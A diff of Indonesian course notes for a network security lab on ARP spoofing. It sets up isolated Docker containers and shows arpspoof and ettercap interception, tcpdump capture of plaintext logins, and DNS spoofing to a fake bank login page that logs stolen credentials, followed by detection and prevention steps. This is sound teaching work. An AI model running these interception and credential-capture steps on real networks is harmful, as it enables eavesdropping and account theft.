@@ -1,14 +1,15 @@
-# 🔐 Pertemuan 3: L2 Security - ARP Spoofing
+# Materi Lengkap Pertemuan 3: L2 Security - ARP Spoofing
 
 ## Daftar Isi
 1. [Apa itu ARP?](#1-apa-itu-arp)
 2. [ARP Spoofing / ARP Poisoning](#2-arp-spoofing--arp-poisoning)
-3. [Hands-On: Setup Lab untuk ARP Spoofing](#3-hands-on-setup-lab-untuk-arp-spoofing)
+3. [Setup Lab dengan Docker Compose](#3-setup-lab-dengan-docker-compose)
 4. [Hands-On: ARP Spoofing dengan arpspoof (dsniff)](#4-hands-on-arp-spoofing-dengan-arpspoof-dsniff)
 5. [Hands-On: ARP Spoofing dengan Ettercap](#5-hands-on-arp-spoofing-dengan-ettercap)
-6. [Hands-On: DNS Spoofing](#6-hands-on-dns-spoofing)
+6. [Hands-On: DNS Spoofing dengan Web Lokal](#6-hands-on-dns-spoofing-dengan-web-lokal)
 7. [Deteksi dan Pencegahan](#7-deteksi-dan-pencegahan)
 8. [Latihan Mandiri](#8-latihan-mandiri)
+9. [Troubleshooting](#9-troubleshooting)
 
 ---
 
@@ -56,8 +57,8 @@ ip neigh show
 arp -n
 
 Contoh output:
-192.168.1.1 dev eth0 lladdr 00:11:22:33:44:55 REACHABLE
-192.168.1.20 dev eth0 lladdr AA:BB:CC:DD:EE:FF STALE
+192.168.1.1 dev eth0 lladdr 02:42:c0:a8:01:01 REACHABLE
+192.168.1.20 dev eth0 lladdr 02:42:c0:a8:01:14 STALE
 ```
 
 ---
@@ -81,22 +82,20 @@ graph TD
     subgraph Jaringan Normal
         A[Korban A<br>IP: 192.168.1.10<br>MAC: AA:AA]
         B[Gateway<br>IP: 192.168.1.1<br>MAC: GG:GG]
-        C[Korban B<br>IP: 192.168.1.20<br>MAC: BB:BB]
+        C[Web Server<br>IP: 192.168.1.200<br>MAC: WW:WW]
         
-        A -->|"Ke internet"| B
-        C -->|"Ke internet"| B
+        A -->|"Ke website"| C
     end
     
     subgraph Setelah ARP Spoofing
         A2[Korban A<br>IP: 192.168.1.10]
         P[Penyerang<br>IP: 192.168.1.100<br>MAC: PP:PP]
-        B2[Gateway<br>IP: 192.168.1.1]
-        C2[Korban B<br>IP: 192.168.1.20]
+        C2[Web Server<br>IP: 192.168.1.200]
         
-        A2 -->|"ARP: 1.1 = PP:PP"| P
-        P -->|"ARP: 1.10 = PP:PP"| B2
-        B2 -->|"ARP: 1.20 = PP:PP"| P
+        A2 -->|"ARP: 1.200 = PP:PP"| P
         P -->|"Forward"| C2
+        C2 -->|"Response"| P
+        P -->|"Forward"| A2
         
         style P fill:#ff8888,stroke:#f00
     end
@@ -111,619 +110,756 @@ graph TD
 
 ---
 
-## 3. Hands-On: Setup Lab untuk ARP Spoofing
+## 3. Setup Lab dengan Docker Compose (Dengan Web Server Lokal)
 
-### 3.1 Topologi Lab
+### 3.1 File docker-compose.yml
 
-Kita akan menggunakan 3 container:
-- **kali-attacker** (penyerang) - IP: 192.168.1.100
-- **ubuntu-target** (korban) - IP: 192.168.1.10
-- **router** (gateway) - IP: 192.168.1.1
+Buat file `docker-compose.yml` di folder `~/netsec-lab`:
 
-### 3.2 Masuk ke Container
+```yaml
+version: '3.8'
+
+services:
+  # Attacker - Kali Linux
+  kali-attacker:
+    image: kalilinux/kali-rolling
+    container_name: kali-attacker
+    hostname: attacker
+    networks:
+      netsec_network:
+        ipv4_address: 192.168.1.100
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+      - SYS_ADMIN
+    sysctls:
+      - net.ipv4.ip_forward=1
+      - net.ipv4.conf.all.forwarding=1
+    privileged: true
+    stdin_open: true
+    tty: true
+    volumes:
+      - ./shared:/shared
+      - ./webpages:/webpages
+    command: /bin/bash -c "apt update && apt install -y dsniff ettercap-graphical net-tools tcpdump nano vim curl wget iproute2 arp-scan isc-dhcp-client python3 && tail -f /dev/null"
+
+  # Target 1 - Ubuntu (Korban)
+  ubuntu-target:
+    image: ubuntu:22.04
+    container_name: ubuntu-target
+    hostname: target1
+    networks:
+      netsec_network:
+        ipv4_address: 192.168.1.10
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+    privileged: true
+    stdin_open: true
+    tty: true
+    volumes:
+      - ./shared:/shared
+    command: /bin/bash -c "apt update && apt install -y net-tools tcpdump curl iputils-ping nano vim iproute2 arp-scan inetutils-tools isc-dhcp-client dnsutils && tail -f /dev/null"
+
+  # Web Server - Apache dengan PHP (Website Lokal)
+  webserver:
+    image: php:7.4-apache
+    container_name: webserver
+    hostname: webserver
+    networks:
+      netsec_network:
+        ipv4_address: 192.168.1.200
+    volumes:
+      - ./webserver/html:/var/www/html
+      - ./webserver/logs:/var/log/apache2
+    privileged: false
+    stdin_open: true
+    tty: true
+    command: /bin/bash -c "docker-php-ext-install mysqli && apache2-foreground"
+
+  # Web Server Palsu - Untuk DNS Spoofing
+  fake-webserver:
+    image: php:7.4-apache
+    container_name: fake-webserver
+    hostname: fake-webserver
+    networks:
+      netsec_network:
+        ipv4_address: 192.168.1.101
+    volumes:
+      - ./fake-webserver/html:/var/www/html
+    privileged: false
+    stdin_open: true
+    tty: true
+    command: /bin/bash -c "apache2-foreground"
+
+  # Router/Gateway
+  router:
+    image: alpine:latest
+    container_name: router
+    hostname: router
+    networks:
+      netsec_network:
+        ipv4_address: 192.168.1.1
+    cap_add:
+      - NET_ADMIN
+      - NET_RAW
+    sysctls:
+      - net.ipv4.ip_forward=1
+      - net.ipv4.conf.all.forwarding=1
+    privileged: true
+    stdin_open: true
+    tty: true
+    volumes:
+      - ./shared:/shared
+    command: /bin/sh -c "apk update && apk add iptables iproute2 net-tools tcpdump curl busybox-extras nano vim arp-scan dhcpcd && tail -f /dev/null"
+
+networks:
+  netsec_network:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 192.168.1.0/24
+          gateway: 192.168.1.254
+```
+
+### 3.2 Buat Website Lokal
 
 ```bash
-# Dari folder netsec-lab
+# Buat struktur folder
+cd ~/netsec-lab
+mkdir -p webserver/html webserver/logs fake-webserver/html shared
+
+# Buat website asli (di webserver)
+cat > webserver/html/index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Website Bank Lokal</title>
+    <style>
+        body { font-family: Arial; margin: 40px; }
+        .container { max-width: 500px; margin: auto; }
+        input { width: 100%; padding: 10px; margin: 5px 0; }
+        button { padding: 10px 20px; background: green; color: white; border: none; }
+        .warning { color: red; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Bank Lokal - Halaman Login</h1>
+        <div class="warning">Website ASLI (IP: 192.168.1.200)</div>
+        <form action="login.php" method="POST">
+            <input type="text" name="username" placeholder="Username" required><br>
+            <input type="password" name="password" placeholder="Password" required><br>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+</body>
+</html>
+EOF
+
+# Buat halaman login handler
+cat > webserver/html/login.php << 'EOF'
+<?php
+$username = $_POST['username'] ?? '';
+$password = $_POST['password'] ?? '';
+
+// Simpan log login
+$log = date('Y-m-d H:i:s') . " - User: $username - Pass: $password - IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+file_put_contents('/var/log/apache2/login.log', $log, FILE_APPEND);
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Diproses</title>
+    <style>
+        body { font-family: Arial; margin: 40px; }
+        .container { max-width: 500px; margin: auto; }
+        .success { color: green; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="success">Login Berhasil!</h1>
+        <p>Selamat datang, <?php echo htmlspecialchars($username); ?>!</p>
+        <p>Ini adalah website ASLI.</p>
+        <p><a href="index.html">Kembali</a></p>
+    </div>
+</body>
+</html>
+EOF
+
+# Buat website palsu (di fake-webserver)
+cat > fake-webserver/html/index.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>⚠️ Website Bank - PERINGATAN ⚠️</title>
+    <style>
+        body { font-family: Arial; margin: 40px; background: #ffeeee; }
+        .container { max-width: 500px; margin: auto; border: 2px solid red; padding: 20px; }
+        input { width: 100%; padding: 10px; margin: 5px 0; }
+        button { padding: 10px 20px; background: red; color: white; border: none; }
+        .warning { color: red; font-weight: bold; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="warning">⚠️ PERINGATAN KEAMANAN ⚠️</h1>
+        <p>Ini adalah <strong>WEBSITE PALSU</strong> yang dibuat untuk demonstrasi ARP Spoofing!</p>
+        <p>IP: 192.168.1.101 (Fake Server)</p>
+        <hr>
+        <h2>Bank Lokal - Halaman Login</h2>
+        <form action="login.php" method="POST">
+            <input type="text" name="username" placeholder="Username" required><br>
+            <input type="password" name="password" placeholder="Password" required><br>
+            <button type="submit">Login (Berbahaya!)</button>
+        </form>
+    </div>
+</body>
+</html>
+EOF
+
+cat > fake-webserver/html/login.php << 'EOF'
+<?php
+$username = $_POST['username'] ?? '';
+$password = $_POST['password'] ?? '';
+
+// Simpan credential yang dicuri
+$log = date('Y-m-d H:i:s') . " - [CURIAN] User: $username - Pass: $password - IP Korban: " . $_SERVER['REMOTE_ADDR'] . "\n";
+file_put_contents('/var/www/html/stolen.txt', $log, FILE_APPEND);
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Diproses</title>
+    <style>
+        body { font-family: Arial; margin: 40px; background: #ffcccc; }
+        .container { max-width: 500px; margin: auto; }
+        .stolen { color: red; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="stolen">⚠️ KREDENSIAL ANDA TELAH DICURI ⚠️</h1>
+        <p>Username: <?php echo htmlspecialchars($username); ?></p>
+        <p>Password: <?php echo htmlspecialchars($password); ?></p>
+        <p>Ini adalah DEMONSTRASI ARP Spoofing!</p>
+        <p>Dalam skenario nyata, Anda akan diarahkan ke website asli tanpa sadar.</p>
+        <p><a href="/stolen.txt">Lihat Log Curian</a></p>
+    </div>
+</body>
+</html>
+EOF
+```
+
+### 3.3 Setup dan Jalankan Container
+
+```bash
 cd ~/netsec-lab
 
-# Masuk ke container attacker
+# Jalankan container
+docker-compose up -d
+
+# Tunggu semua container siap
+docker-compose ps
+
+# Lihat log
+docker-compose logs -f
+```
+
+### 3.4 Verifikasi Container Berjalan
+
+```bash
+# Cek semua container
+docker ps
+
+# Output seharusnya:
+# - kali-attacker (192.168.1.100)
+# - ubuntu-target (192.168.1.10)
+# - webserver (192.168.1.200)
+# - fake-webserver (192.168.1.101)
+# - router (192.168.1.1)
+```
+
+### 3.5 Test Website Lokal
+
+**Dari target:**
+```bash
+# Test akses ke website asli
+curl http://192.168.1.200
+
+# Atau buka dengan browser (jika ada GUI)
+# http://192.168.1.200
+```
+
+**Dari attacker:**
+```bash
+# Test akses ke fake website
+curl http://192.168.1.101
+```
+
+### 3.6 Setup Internet Access (Opsional)
+
+Jika ingin akses internet juga:
+
+```bash
+# Di router
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+```
+
+### 3.7 Buka Terminal untuk Setiap Container
+
+**Terminal 1 - Attacker:**
+```bash
+cd ~/netsec-lab
 docker-compose exec kali-attacker bash
 ```
 
-### 3.3 Install Tools
-
+**Terminal 2 - Target:**
 ```bash
-# Update repositori
-apt update
-
-# Install dsniff (berisi arpspoof)
-apt install -y dsniff
-
-# Install ettercap
-apt install -y ettercap-graphical
-
-# Install net-tools untuk ifconfig
-apt install -y net-tools
-
-# Install tcpdump untuk monitoring
-apt install -y tcpdump
-
-# Install nano untuk edit file
-apt install -y nano
-```
-
-### 3.4 Cek IP Address
-
-```bash
-# Di container attacker
-ip addr show eth0
-# Atau
-ifconfig eth0
-
-# Pastikan IP: 192.168.1.100
-```
-
-### 3.5 Aktifkan IP Forwarding (Penting!)
-
-```bash
-# Agar attacker bisa meneruskan paket (seperti router)
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-# Verifikasi
-cat /proc/sys/net/ipv4/ip_forward
-# Output: 1
-```
-
-### 3.6 Cek ARP Table Awal
-
-```bash
-# Lihat ARP table sebelum serangan
-arp -n
-```
-
-### 3.7 Buka Terminal untuk Target
-
-Buka terminal baru:
-
-```bash
-# Terminal 2 - Masuk ke ubuntu-target
 cd ~/netsec-lab
 docker-compose exec ubuntu-target bash
-
-# Di container target
-apt update
-apt install -y net-tools tcpdump curl
-
-# Cek IP
-ip addr show eth0
-# Seharusnya 192.168.1.10
 ```
 
-### 3.8 Buka Terminal untuk Router/Gateway
-
-Buka terminal baru:
-
+**Terminal 3 - Router:**
 ```bash
-# Terminal 3 - Masuk ke router
 cd ~/netsec-lab
-docker-compose exec router bash
-
-# Di container router
-apt update
-apt install -y net-tools tcpdump
-
-# Cek IP
-ip addr show eth0
-# Seharusnya 192.168.1.1
+docker-compose exec router sh
 ```
 
 ---
 
 ## 4. Hands-On: ARP Spoofing dengan arpspoof (dsniff)
 
-### 4.1 Tanpa ARP Spoofing - Kondisi Normal
+### 4.1 Install Tools di Attacker
 
-**Di target (192.168.1.10)**:
 ```bash
-# Pantau koneksi ke internet
-ping -c 4 8.8.8.8
-# Seharusnya berhasil
+# Di attacker
+apt update
+apt install -y dsniff net-tools tcpdump
+```
+
+### 4.2 Kondisi Normal - Sebelum Serangan
+
+**Di target:**
+```bash
+# Cek ARP table
+arp -n
+
+# Akses website asli
+curl http://192.168.1.200
+
+# Cek koneksi ke webserver
+ping -c 3 192.168.1.200
+```
+
+### 4.3 Aktifkan IP Forwarding di Attacker
+
+```bash
+# Di attacker
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+# Output: 1
+```
+
+### 4.4 Mulai ARP Spoofing - Target ke Web Server
+
+**Di attacker, buat 2 terminal:**
+
+**Terminal A - Spoof target (bohongi target bahwa attacker adalah webserver):**
+```bash
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.200
+```
+
+**Terminal B - Spoof webserver (bohongi webserver bahwa attacker adalah target):**
+```bash
+arpspoof -i eth0 -t 192.168.1.200 192.168.1.10
+```
+
+### 4.5 Verifikasi ARP Spoofing Berhasil
+
+**Di target:**
+```bash
+# Cek ARP table
+arp -n | grep 192.168.1.200
+
+# MAC address webserver sekarang seharusnya MAC attacker
+# Contoh: 192.168.1.200 ether 02:42:c0:a8:01:64 (MAC attacker)
+```
+
+**Di webserver:**
+```bash
+# Masuk ke webserver
+cd ~/netsec-lab
+docker-compose exec webserver bash
 
 # Cek ARP table
-arp -n | grep 192.168.1.1
-# Output: 192.168.1.1 ether 00:11:22:33:44:55 (MAC router asli)
-```
-
-### 4.2 Mulai ARP Spoofing - 2 Arah (Full Duplex)
-
-**Di attacker (192.168.1.100)**:
-
-```bash
-# Terminal attacker - jalankan di background atau terminal terpisah
-
-# Terminal 1 - Spoof target (bohongi target bahwa attacker adalah gateway)
-arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
-
-# Terminal 2 - Spoof gateway (bohongi gateway bahwa attacker adalah target)
-arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
-```
-
-**Penjelasan perintah**:
-- `-i eth0`: Interface yang digunakan
-- `-t 192.168.1.10`: Target korban
-- `192.168.1.1`: Host yang ingin di-spoof (gateway)
-
-### 4.3 Verifikasi ARP Spoofing Berhasil
-
-**Di target (192.168.1.10)**:
-```bash
-# Cek ARP table lagi
-arp -n | grep 192.168.1.1
-
-# MAC address gateway sekarang seharusnya berubah menjadi MAC attacker
-# Contoh: 192.168.1.1 ether 02:42:c0:a8:01:64 (MAC attacker)
-```
-
-**Di router/gateway (192.168.1.1)**:
-```bash
-# Cek ARP table di gateway
 arp -n | grep 192.168.1.10
-
 # MAC address target sekarang seharusnya MAC attacker
 ```
 
-### 4.4 Sniffing Traffic dengan tcpdump
+### 4.6 Sniffing Traffic Login
 
-**Di attacker**:
+**Di attacker (Terminal C):**
 ```bash
-# Buka terminal baru di attacker
-# Tangkap semua traffic yang lewat
-tcpdump -i eth0 -n -v
+# Sniff HTTP traffic
+tcpdump -i eth0 -n -A port 80
 
-# Atau tangkap traffic HTTP saja
-tcpdump -i eth0 -n port 80 -A
-
-# Atau simpan ke file untuk analisis
-tcpdump -i eth0 -w capture.pcap
+# Atau simpan ke file
+tcpdump -i eth0 -w /shared/arp-spoof.pcap port 80
 ```
 
-### 4.5 Simulasi Login HTTP
+### 4.7 Simulasi Login dari Target
 
-**Di target** (terminal terpisah):
+**Di target:**
 ```bash
-# Simulasi login ke website (gunakan curl)
-curl -X POST http://example.com/login \
+# Login ke website asli (tapi traffic lewat attacker)
+curl -X POST http://192.168.1.200/login.php \
   -d "username=alice&password=rahasia123"
 
-# Atau buat request HTTP sederhana
-echo "GET / HTTP/1.0" | nc example.com 80
+# Atau gunakan form di browser
+# Buka http://192.168.1.200 di browser (jika ada GUI)
 ```
 
-**Di attacker**:
+**Di attacker (Terminal C):**
 ```bash
-# Lihat hasil tangkapan di tcpdump
-# Akan terlihat username dan password dalam bentuk plain text
+# Akan terlihat POST request dengan credential
+# Contoh output:
+# POST /login.php HTTP/1.1
+# Host: 192.168.1.200
+# Content-Type: application/x-www-form-urlencoded
+# Content-Length: 33
+# 
+# username=alice&password=rahasia123
 ```
 
-### 4.6 Menghentikan Serangan
+### 4.8 Lihat Log di Web Server
 
+**Di webserver:**
 ```bash
-# Di terminal attacker yang menjalankan arpspoof
-Ctrl+C
+# Cek log login
+cat /var/log/apache2/login.log
 
-# Kembalikan ARP table ke normal (opsional)
-# Atau biarkan expire sendiri setelah beberapa menit
-
-# Matikan IP forwarding
-echo 0 > /proc/sys/net/ipv4/ip_forward
+# Akan terlihat login dari IP attacker (bukan target)
+# Karena attacker yang meneruskan traffic
 ```
 
 ---
 
 ## 5. Hands-On: ARP Spoofing dengan Ettercap
 
-### 5.1 Pengenalan Ettercap
+### 5.1 Install Ettercap
 
-**Ettercap** adalah tools komprehensif untuk MITM attack dengan fitur:
-- ARP poisoning
-- DNS spoofing
-- Filter dan plugin
-- Antarmuka teks dan grafis
+```bash
+# Di attacker
+apt install -y ettercap-graphical
+```
 
 ### 5.2 Mode Text-Based Ettercap
 
 ```bash
-# Jalankan ettercap dalam mode teks (TUI)
-ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1//
+# Jalankan ettercap untuk spoof target ke webserver
+ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.200//
 
 # Penjelasan:
 # -T : Text mode
 # -i eth0 : Interface
 # -M arp:remote : ARP poisoning mode
-# Target: /IP korban// /IP gateway//
-
-# Setelah masuk:
-# - Tekan 'h' untuk help
-# - Tekan 'q' untuk quit
-# - Otomatis akan menampilkan traffic yang lewat
+# Target: /IP korban// /IP webserver//
 ```
 
-### 5.3 Mode GUI Ettercap
+### 5.3 Melihat Hasil Sniffing
 
-Jika ingin menggunakan GUI (perlu X11 forwarding):
-
-```bash
-# Install X11 di Windows/Mac/Linux
-# Di WSL/Windows: pastikan XServer (VcXsrv/Xming) berjalan
-
-# Di Kali container dengan X11 forwarding
-ettercap -G
+Setelah menjalankan ettercap, akan terlihat:
+```
+HTTP : 192.168.1.10:54321 -> 192.168.1.200:80
+POST /login.php HTTP/1.1
+Host: 192.168.1.200
+username=alice&password=rahasia123
 ```
 
-### 5.4 Unified Sniffing dengan Ettercap
+### 5.4 Simpan Hasil Capture
 
 ```bash
-# Jalankan ettercap dengan unified sniffing
-ettercap -T -i eth0 -M arp:remote // //
-
-# Ini akan melakukan ARP spoof pada semua host di jaringan
-# HATI-HATI: ini akan membanjiri jaringan
-```
-
-### 5.5 Melihat Hasil Sniffing di Ettercap
-
-```bash
-# Setelah menjalankan ettercap, Anda akan melihat:
-# - Semua koneksi yang lewat
-# - Password yang dikirim (HTTP, FTP, Telnet)
-# - URL yang dikunjungi
-
-# Contoh output:
-HTTP : 192.168.1.10:54321 -> 93.184.216.34:80
-GET /index.html HTTP/1.1
-Host: example.com
-```
-
-### 5.6 Menyimpan Hasil Capture
-
-```bash
-# Jalankan ettercap dengan output ke file
-ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1// -w capture.ettercap
-
-# Baca hasil capture nanti
-ettercap -T -r capture.ettercap
+# Jalankan dengan output ke file
+ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.200// -w /shared/ettercap.pcap
 ```
 
 ---
 
-## 6. Hands-On: DNS Spoofing
+## 6. Hands-On: DNS Spoofing dengan Web Lokal
 
-### 6.1 Apa itu DNS Spoofing?
+### 6.1 Setup DNS Spoofing
 
-DNS Spoofing mengarahkan korban ke website palsu meskipun mereka mengetik alamat website yang benar.
-
-### 6.2 Setup DNS Spoofing dengan Ettercap
-
-**Di attacker**:
+**Di attacker:**
 
 ```bash
-# 1. Buat file konfigurasi DNS spoofing
-cat > /tmp/dns.spoof << EOF
-# Format: domain IP_palsu
-example.com 192.168.1.100
-facebook.com 192.168.1.100
-google.com 192.168.1.100
-bank.com 192.168.1.100
+# Buat file konfigurasi DNS spoofing
+cat > /tmp/dns.spoof << 'EOF'
+# Arahkan domain ke fake webserver
+bank.local 192.168.1.101
+secure-bank.local 192.168.1.101
+login.bank.local 192.168.1.101
 EOF
-
-# 2. Jalankan web server palsu di attacker
-python3 -m http.server 80 &
-# Atau buat halaman phishing sederhana
-cat > index.html << EOF
-<!DOCTYPE html>
-<html>
-<head><title>Website Palsu</title></head>
-<body>
-<h1>Website Palsu</h1>
-<p>Ini adalah website palsu untuk demonstrasi.</p>
-<form>
-Username: <input type="text"><br>
-Password: <input type="password"><br>
-<input type="submit" value="Login">
-</form>
-</body>
-</html>
-EOF
-
-# 3. Jalankan ettercap dengan plugin DNS spoof
-ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1// -P dns_spoof
-
-# Di menu ettercap, setelah plugin dimuat:
-# Tekan 'p' untuk mengaktifkan plugin dns_spoof
-# Setelah itu, semua DNS request akan diarahkan ke IP kita
 ```
 
-### 6.3 Konfigurasi DNS Spoof di Ettercap (Alternatif)
+### 6.2 Jalankan Ettercap dengan DNS Spoof
+
+```bash
+# Jalankan ettercap dengan plugin DNS spoof
+ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1// -P dns_spoof
+
+# Setelah masuk, aktifkan plugin dns_spoof
+# Tekan 'p' → pilih nomor plugin dns_spoof
+```
+
+### 6.3 Konfigurasi DNS Spoof via File (Alternatif)
 
 ```bash
 # Edit file konfigurasi ettercap
 nano /etc/ettercap/etter.dns
 
-# Tambahkan di akhir file:
-example.com A 192.168.1.100
-*.example.com A 192.168.1.100
-facebook.com A 192.168.1.100
-bank.com A 192.168.1.100
+# Tambahkan:
+bank.local A 192.168.1.101
+*.bank.local A 192.168.1.101
 
-# Jalankan dengan dns_spoof
+# Jalankan
 ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1// -P dns_spoof
 ```
 
 ### 6.4 Verifikasi dari Target
 
-**Di target (192.168.1.10)**:
+**Di target:**
 ```bash
-# Coba ping domain yang di-spoof
-ping -c 2 example.com
-# Seharusnya merespon dari IP 192.168.1.100 (attacker)
+# Install dnsutils
+apt install -y dnsutils
 
-# Cek dengan nslookup
-nslookup example.com
-# Server: 192.168.1.1
-# Address: 192.168.1.1#53
-# 
-# Name: example.com
-# Address: 192.168.1.100 (INI PALSU!)
+# Cek DNS server
+cat /etc/resolv.conf
 
-# Buka dengan curl
-curl http://example.com
-# Akan mendapatkan halaman palsu dari attacker
+# Test DNS spoofing
+nslookup bank.local
+# Seharusnya mengarah ke 192.168.1.101 (fake webserver)
+
+# Ping domain
+ping -c 2 bank.local
+# Akan ping ke 192.168.1.101
+
+# Buka website dengan domain
+curl http://bank.local
+# Akan mendapatkan halaman palsu
+```
+
+### 6.5 Curi Credential dengan Fake Website
+
+**Di target:**
+```bash
+# Korban mengira mengakses website asli
+curl -X POST http://bank.local/login.php \
+  -d "username=bob&password=secret123"
+```
+
+**Di fake-webserver:**
+```bash
+# Lihat credential yang tercuri
+cd ~/netsec-lab
+docker-compose exec fake-webserver bash
+cat /var/www/html/stolen.txt
+
+# Output:
+# 2025-02-25 14:30:15 - [CURIAN] User: bob - Pass: secret123 - IP Korban: 192.168.1.10
 ```
 
 ---
 
 ## 7. Deteksi dan Pencegahan
 
-### 7.1 Deteksi ARP Spoofing dengan ARP Watch
+### 7.1 Deteksi ARP Spoofing Manual
 
-**Di target atau admin**:
+**Di target, buat script deteksi:**
+```bash
+cat > /tmp/check_arp.sh << 'EOF'
+#!/bin/bash
+
+# Ganti dengan MAC asli webserver
+REAL_WEB_MAC="02:42:c0:a8:01:c8"  # MAC webserver asli
+
+while true; do
+    CURRENT_MAC=$(arp -n | grep 192.168.1.200 | awk '{print $3}')
+    
+    if [ "$CURRENT_MAC" != "$REAL_WEB_MAC" ]; then
+        echo "$(date): ⚠️ PERINGATAN! ARP Spoofing terdeteksi!"
+        echo "Webserver MAC asli: $REAL_WEB_MAC"
+        echo "Webserver MAC sekarang: $CURRENT_MAC"
+    fi
+    
+    sleep 3
+done
+EOF
+
+chmod +x /tmp/check_arp.sh
+/tmp/check_arp.sh
+```
+
+### 7.2 Deteksi dengan arpwatch
 
 ```bash
 # Install arpwatch
 apt install -y arpwatch
 
-# Jalankan monitoring
+# Jalankan monitoring untuk webserver
 arpwatch -i eth0
 
 # Lihat log
 tail -f /var/log/syslog | grep arpwatch
-# Akan mencatat perubahan MAC address yang mencurigakan
 ```
 
-### 7.2 Deteksi Manual dengan ARP Scanning
+### 7.3 Pencegahan dengan Static ARP
 
+**Di target:**
 ```bash
-# Script sederhana untuk deteksi ARP spoofing
-cat > detect_arp_spoof.sh << 'EOF'
-#!/bin/bash
+# Tambahkan static ARP untuk webserver
+arp -s 192.168.1.200 02:42:c0:a8:01:c8
 
-# Dapatkan MAC gateway sebenarnya (dari konfigurasi statis)
-REAL_GW_MAC="00:11:22:33:44:55"  # Ganti dengan MAC asli gateway
-
-while true; do
-    # Cek MAC gateway dari ARP table
-    CURRENT_MAC=$(arp -n | grep 192.168.1.1 | awk '{print $3}')
-    
-    if [ "$CURRENT_MAC" != "$REAL_GW_MAC" ]; then
-        echo "$(date): PERINGATAN! ARP Spoofing terdeteksi!"
-        echo "Gateway MAC seharusnya: $REAL_GW_MAC"
-        echo "Gateway MAC sekarang: $CURRENT_MAC"
-    fi
-    
-    sleep 5
-done
-EOF
-
-chmod +x detect_arp_spoof.sh
-./detect_arp_spoof.sh
+# Verifikasi
+arp -n | grep 192.168.1.200
+# Akan ada flag PERMANENT
 ```
 
-### 7.3 Deteksi dengan tcpdump
+### 7.4 Pencegahan dengan HTTPS Lokal
+
+Untuk website lokal, kita bisa gunakan self-signed certificate:
 
 ```bash
-# Tangkap ARP reply yang tidak wajar (terlalu banyak)
-tcpdump -i eth0 arp -n
+# Di webserver, generate sertifikat SSL
+docker-compose exec webserver bash
+apt update && apt install -y openssl
 
-# ARP reply yang mencurigakan:
-# - Banyak ARP reply tanpa request
-# - MAC address yang sama mengklaim banyak IP
-# - MAC address berubah-ubah untuk IP yang sama
-```
+# Generate self-signed certificate
+mkdir -p /etc/ssl/private /etc/ssl/certs
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
+  -keyout /etc/ssl/private/server.key \
+  -out /etc/ssl/certs/server.crt \
+  -subj "/C=ID/ST=Jakarta/L=Jakarta/O=Bank Lokal/CN=bank.local"
 
-### 7.4 Pencegahan dengan ARP Static Entry
-
-**Di target**:
-```bash
-# Tambahkan static ARP entry untuk gateway
-arp -s 192.168.1.1 00:11:22:33:44:55
-
-# Cek ARP table
-arp -n | grep 192.168.1.1
-# Akan ada flag PERMANENT atau STATIC
-
-# Dengan static entry, ARP spoofing tidak akan berpengaruh
-# Karena sistem tidak akan memperbarui ARP cache untuk IP tersebut
-```
-
-### 7.5 Pencegahan dengan Port Security (di Switch)
-
-**Konfigurasi di switch managed** (simulasi):
-```bash
-# Di switch Cisco
-interface eth0/1
- switchport port-security
- switchport port-security maximum 1
- switchport port-security mac-address sticky
- switchport port-security violation shutdown
-
-# Ini akan mematikan port jika ada lebih dari 1 MAC address
-```
-
-### 7.6 Pencegahan dengan DHCP Snooping (di Switch)
-
-```bash
-# Di switch Cisco
-ip dhcp snooping
-ip dhcp snooping vlan 1
-interface eth0/1
- ip dhcp snooping trust
-```
-
-### 7.7 Pencegahan dengan Enkripsi
-
-**Solusi terbaik**: Gunakan enkripsi end-to-end
-
-```bash
-# HTTPS melindungi dari sniffing meskipun ARP spoofing berhasil
-# SSH, VPN, TLS melindungi data
+# Konfigurasi Apache untuk HTTPS
+a2enmod ssl
+a2ensite default-ssl
+service apache2 restart
 ```
 
 ---
 
 ## 8. Latihan Mandiri
 
-### Latihan 1: ARP Spoofing Sederhana
+### Latihan 1: ARP Spoofing ke Semua Host
 
 ```bash
-# Tujuan: Memutus koneksi korban (DoS)
-
-# Di attacker, lakukan ARP spoofing satu arah saja
+# Di attacker - spoof semua komunikasi
+arpspoof -i eth0 -t 192.168.1.10 192.168.1.200
+arpspoof -i eth0 -t 192.168.1.200 192.168.1.10
 arpspoof -i eth0 -t 192.168.1.10 192.168.1.1
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
 
-# Jangan jalankan arpspoof untuk gateway
-# Jangan aktifkan IP forwarding
-
-# Di target, coba ping ke internet
-ping 8.8.8.8
-# Seharusnya tidak bisa (Request timeout)
+# Sniff semua traffic
+tcpdump -i eth0 -A
 ```
 
-### Latihan 2: Sniffing FTP Login
+### Latihan 2: Sniffing Form Data
 
 ```bash
-# Di target, install FTP server sederhana
-apt install -y vsftpd
-service vsftpd start
+# Di attacker, buat filter tcpdump spesifik
+tcpdump -i eth0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'
